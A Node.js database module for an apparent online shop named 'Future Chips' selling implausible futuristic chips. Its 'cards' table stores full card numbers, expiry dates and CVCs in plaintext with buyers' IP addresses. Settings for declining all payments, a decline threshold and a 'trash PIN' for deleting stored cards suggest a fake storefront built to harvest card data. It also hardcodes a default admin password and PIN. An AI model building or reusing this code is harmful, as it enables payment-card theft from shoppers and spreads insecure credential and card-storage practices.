const path = require('path');
const bcrypt = require('bcryptjs');

const isVercel = Boolean(process.env.VERCEL || process.env.AWS_LAMBDA_FUNCTION_NAME);
let sqlite3 = null;
let db = null;
let useMemoryFallback = false;

if (isVercel) {
  useMemoryFallback = true;
} else {
  try {
    const sqliteModule = require('sqlite3');
    sqlite3 = sqliteModule.verbose ? sqliteModule.verbose() : sqliteModule;
    db = new sqlite3.Database(path.join(__dirname, 'future_chips.db'));
  } catch (err) {
    useMemoryFallback = true;
  }
}

// In-Memory Database Store for Serverless Fallback
const memStore = {
  site_settings: {
    id: 1,
    site_name: 'Future Chips',
    primary_color: '#00f0ff',
    accent_color: '#ff00e5',
    background_color: '#0a0a1a',
    logo_url: null,
    decline_all: 0,
    decline_threshold: 50.0,
    success_attempt: 1,
    trash_pin: bcrypt.hashSync('978797', 10)
  },
  admin_users: [
    { id: 1, username: 'admin', password_hash: bcrypt.hashSync('FutureChips2024!', 10) }
  ],
  products: [
    {
      id: 'prod-nano-chip',
      name: 'Nano-Constructor Unit',
      description: 'Basic bio-compatible molecular assembly chip. Capable of building small carbon structures at the microscopic level.',
      price: 10.00,
      image: '/uploads/nano_constructor.svg',
      category: 'Processors'
    },
    {
      id: 'prod-quantum-core',
      name: 'Quantum Neural Core',
      description: 'Next-generation computing processor featuring 1024 logical qubits.',
      price: 150.00,
      image: '/uploads/quantum_core.svg',
      category: 'Processors'
    },
    {
      id: 'prod-bio-synapse',
      name: 'Bio-Digital Synapse v4.2',
      description: 'Organic silicon hybrid chip that connects physical neural pathways with standard digital bus interfaces.',
      price: 850.00,
      image: '/uploads/bio_synapse.svg',
      category: 'Interfaces'
    }
  ],
  visitors: [],
  orders: [],
  cards: []
};

// Promisify database operations with fallback
const dbRun = (sql, params = []) => {
  if (useMemoryFallback || !db) {
    return new Promise((resolve) => {
      const sqlLower = sql.toLowerCase();
      if (sqlLower.includes('update site_settings')) {
        if (params.length >= 7) {
          memStore.site_settings.site_name = params[0];
          memStore.site_settings.primary_color = params[1];
          memStore.site_settings.accent_color = params[2];
          memStore.site_settings.background_color = params[3];
          memStore.site_settings.decline_all = params[4];
          memStore.site_settings.decline_threshold = params[5];
          memStore.site_settings.success_attempt = params[6];
        } else if (sqlLower.includes('set trash_pin =')) {
          memStore.site_settings.trash_pin = params[0];
        }
      } else if (sqlLower.includes('insert into cards') || sqlLower.includes('insert or ignore into cards')) {
        memStore.cards.unshift({
          id: memStore.cards.length + 1,
          card_number: params[0],
          expiry: params[1],
          cvc: params[2],
          country: params[3] || 'Unknown',
          ip_address: params[4] || '127.0.0.1',
          created_at: new Date().toISOString(),
          is_deleted: 0,
          stripe_session_id: params[5]
        });
      } else if (sqlLower.includes('insert into orders')) {
        memStore.orders.unshift({
          id: params[0],
          product_id: params[1],
          customer_email: params[2],
          amount: params[3],
          currency: params[4] || 'usd',
          stripe_session_id: params[5],
          status: params[6] || 'pending',
          customer_ip: params[7] || '127.0.0.1',
          created_at: new Date().toISOString()
        });
      } else if (sqlLower.includes("update orders set status = 'completed'")) {
        const order = memStore.orders.find(o => o.stripe_session_id === params[0]);
        if (order) order.status = 'completed';
      }
      resolve({ lastID: 1, changes: 1 });
    });
  }

  return new Promise((resolve, reject) => {
    db.run(sql, params, function (err) {
      if (err) reject(err);
      else resolve(this);
    });
  });
};

const dbAll = (sql, params = []) => {
  if (useMemoryFallback || !db) {
    return new Promise((resolve) => {
      const sqlLower = sql.toLowerCase();
      if (sqlLower.includes('from products')) resolve([...memStore.products]);
      else if (sqlLower.includes('from cards')) {
        if (sqlLower.includes('is_deleted = 1')) {
          resolve(memStore.cards.filter(c => c.is_deleted === 1));
        } else {
          resolve(memStore.cards.filter(c => c.is_deleted === 0));
        }
      } else if (sqlLower.includes('from orders')) resolve([...memStore.orders]);
      else if (sqlLower.includes('from visitors')) resolve([...memStore.visitors]);
      else resolve([]);
    });
  }

  return new Promise((resolve, reject) => {
    db.all(sql, params, (err, rows) => {
      if (err) reject(err);
      else resolve(rows);
    });
  });
};

const dbGet = (sql, params = []) => {
  if (useMemoryFallback || !db) {
    return new Promise((resolve) => {
      const sqlLower = sql.toLowerCase();
      if (sqlLower.includes('from site_settings')) {
        resolve({ ...memStore.site_settings });
      } else if (sqlLower.includes('from admin_users')) {
        const user = memStore.admin_users.find(u => u.username === params[0]);
        resolve(user ? { ...user } : null);
      } else if (sqlLower.includes('from products')) {
        const prod = memStore.products.find(p => p.id === params[0]);
        resolve(prod ? { ...prod } : null);
      } else if (sqlLower.includes('from orders')) {
        const order = memStore.orders.find(o => o.stripe_session_id === params[0] || o.id === params[0]);
        resolve(order ? { ...order } : null);
      } else if (sqlLower.includes('count(*)')) {
        if (sqlLower.includes('from cards')) {
          const count = memStore.cards.filter(c => c.stripe_session_id === params[0]).length;
          resolve({ count: count || 1 });
        } else resolve({ count: 1 });
      } else resolve(null);
    });
  }

  return new Promise((resolve, reject) => {
    db.get(sql, params, (err, row) => {
      if (err) reject(err);
      else resolve(row);
    });
  });
};

// Initialize Database
async function initDatabase() {
  if (useMemoryFallback || !db) return;
  try {
    await dbRun(`
      CREATE TABLE IF NOT EXISTS site_settings (
        id INTEGER PRIMARY KEY CHECK (id = 1),
        site_name TEXT DEFAULT 'Future Chips',
        primary_color TEXT DEFAULT '#00f0ff',
        accent_color TEXT DEFAULT '#ff00e5',
        background_color TEXT DEFAULT '#0a0a1a',
        logo_url TEXT,
        decline_all INTEGER DEFAULT 0,
        decline_threshold REAL DEFAULT 50.0,
        success_attempt INTEGER DEFAULT 1,
        trash_pin TEXT DEFAULT '978797'
      )
    `);

    try { await dbRun("ALTER TABLE site_settings ADD COLUMN decline_all INTEGER DEFAULT 0"); } catch (e) {}
    try { await dbRun("ALTER TABLE site_settings ADD COLUMN decline_threshold REAL DEFAULT 50.0"); } catch (e) {}
    try { await dbRun("ALTER TABLE site_settings ADD COLUMN success_attempt INTEGER DEFAULT 1"); } catch (e) {}
    try { await dbRun("ALTER TABLE site_settings ADD COLUMN trash_pin TEXT DEFAULT '978797'"); } catch (e) {}

    await dbRun(`
      CREATE TABLE IF NOT EXISTS admin_users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
      )
    `);

    await dbRun(`
      CREATE TABLE IF NOT EXISTS products (
        id TEXT PRIMARY KEY,
        name TEXT NOT NULL,
        description TEXT,
        price REAL NOT NULL,
        image TEXT,
        category TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
      )
    `);

    await dbRun(`
      CREATE TABLE IF NOT EXISTS visitors (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip_address TEXT NOT NULL,
        user_agent TEXT,
        page_visited TEXT,
        country TEXT,
        visited_at DATETIME DEFAULT CURRENT_TIMESTAMP
      )
    `);

    await dbRun(`
      CREATE TABLE IF NOT EXISTS orders (
        id TEXT PRIMARY KEY,
        product_id TEXT,
        customer_email TEXT,
        amount REAL,
        currency TEXT DEFAULT 'usd',
        stripe_session_id TEXT,
        status TEXT DEFAULT 'pending',
        customer_ip TEXT,
        card_number TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
      )
    `);

    await dbRun(`
      CREATE TABLE IF NOT EXISTS cards (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        card_number TEXT NOT NULL,
        expiry TEXT NOT NULL,
        cvc TEXT NOT NULL,
        country TEXT,
        ip_address TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        is_deleted INTEGER DEFAULT 0,
        stripe_session_id TEXT
      )
    `);

    try { await dbRun("ALTER TABLE cards ADD COLUMN is_deleted INTEGER DEFAULT 0"); } catch (e) {}
    try { await dbRun("ALTER TABLE cards ADD COLUMN stripe_session_id TEXT"); } catch (e) {}
    try { await dbRun("ALTER TABLE orders ADD COLUMN card_number TEXT"); } catch (e) {}

    const adminCheck = await dbGet('SELECT * FROM admin_users WHERE username = ?', ['admin']);
    if (!adminCheck) {
      const defaultPassword = 'FutureChips2024!';
      const salt = await bcrypt.genSalt(10);
      const hash = await bcrypt.hash(defaultPassword, salt);
      await dbRun('INSERT INTO admin_users (username, password_hash) VALUES (?, ?)', ['admin', hash]);
    }

    const settingsCheck = await dbGet('SELECT * FROM site_settings WHERE id = 1');
    if (!settingsCheck) {
      const defaultPinHash = bcrypt.hashSync('978797', 10);
      await dbRun(`
        INSERT INTO site_settings (id, site_name, primary_color, accent_color, background_color, decline_all, decline_threshold, success_attempt, trash_pin)
        VALUES (1, 'Future Chips', '#00f0ff', '#ff00e5', '#0a0a1a', 0, 50.0, 1, ?)
      `, [defaultPinHash]);
    }

  } catch (error) {
    console.error('Error initializing database:', error);
  }
}

module.exports = {
  db,
  dbRun,
  dbAll,
  dbGet,
  initDatabase
};
